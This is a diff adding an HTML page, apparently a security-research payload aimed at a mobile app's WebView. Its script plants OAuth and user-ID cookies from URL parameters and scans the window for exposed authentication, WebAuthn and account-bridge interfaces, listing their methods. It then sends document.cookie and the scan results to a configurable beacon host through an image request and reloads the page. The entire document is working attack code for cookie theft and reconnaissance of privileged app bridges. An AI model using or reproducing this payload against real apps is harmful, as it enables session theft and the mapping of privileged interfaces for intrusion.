@@ -1,0 +1,50 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>MM H0036 EXCH</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<body style="background:#030;color:#fff;font-family:sans-serif;font-size:15px">
+<h1 id="st">H0036 COOKIE+PROBE</h1>
+<pre id="log">BOOT</pre>
+<script>
+function q(k){ var s=location.search + "&" + location.hash.slice(1);
+  var m=s.match(new RegExp("[&#?]*"+k+"=([^&]*)")); return m ? decodeURIComponent(m[1]) : null; }
+function ev(m){ try{ document.getElementById('log').textContent += "\n" + m;
+  document.title = ("EV:" + m).slice(0,300); }catch(e){} }
+var TK = q("tok") || "";
+var GY = q("gaid") || "116671841131183874863";
+var GC = q("gasc") || "H0036_5572";
+var BZ = q("bz") || "http://10.0.2.2:18895/beacon";
+function bz(phase, extra){
+  try {
+    var d = document.cookie || "NONE";
+    var u = BZ + "?phase=" + encodeURIComponent(phase) + "&jar=" + encodeURIComponent(d) + extra;
+    var im = new Image(); im.src = u;
+  } catch(e) { ev("BZ_ERR:" + e); }
+}
+try { document.cookie = "oauth_token=" + TK + "; path=/"; } catch(e){ ev("CT_ERR:"+e); }
+try { document.cookie = "user_id=" + GY + "; path=/"; } catch(e){ ev("CU_ERR:"+e); }
+try { document.cookie = "GASC=" + GC + "; path=/"; } catch(e){ ev("CG_ERR:"+e); }
+ev("loaded " + location.href);
+var probes = [];
+try { probes.push("mm=" + (typeof window.mm !== "undefined" ? "present" : "absent")); } catch(e){ probes.push("mm=ERR"); }
+try { probes.push("webauthn=" + (typeof window.__webauthn_interface__ !== "undefined" ? "present" : "absent")); } catch(e){ probes.push("webauthn=ERR"); }
+try {
+  var kk = [];
+  for (var k in window) {
+    var v = null;
+    try { v = window[k]; } catch(e) {}
+    if (v && (typeof v === "object" || typeof v === "function") && /mm|auth|webauthn|addaccount|bridg/i.test(k)) kk.push(k + ":" + typeof v);
+  }
+  probes.push("scan=" + kk.join(","));
+} catch(e) {}
+try {
+  var mmkeys = "NA";
+  if (typeof window.mm !== "undefined") {
+    var arr = [];
+    for (var m in window.mm) { try { arr.push(m + ":" + typeof window.mm[m]); } catch(e){} }
+    mmkeys = arr.join(",");
+  }
+  probes.push("mmkeys=" + mmkeys);
+} catch(e) {}
+ev("PROBES " + probes.join(";"));
+bz("set", "&probes=" + encodeURIComponent(probes.join(";")));
+setTimeout(function(){ try { location.reload(); } catch(e){} }, 600);
+</script></body></html>
